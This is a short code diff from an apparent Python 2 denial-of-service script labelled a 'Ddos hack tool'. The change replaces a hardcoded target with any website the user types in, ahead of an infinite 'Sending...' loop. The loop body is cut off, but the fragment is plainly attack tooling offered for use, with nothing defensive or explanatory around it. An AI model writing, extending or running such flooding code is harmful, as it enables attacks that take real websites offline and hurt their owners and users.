@@ -15,7 +15,7 @@ Fast and easy Ddos hack tool Beta 0.1
 print header
 
 cybers = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-cybers.connect(("www.google.com",80))
+cybers.connect((raw_input("Digite o site: "),80))
 
 while 1:
 	print "Sending..."
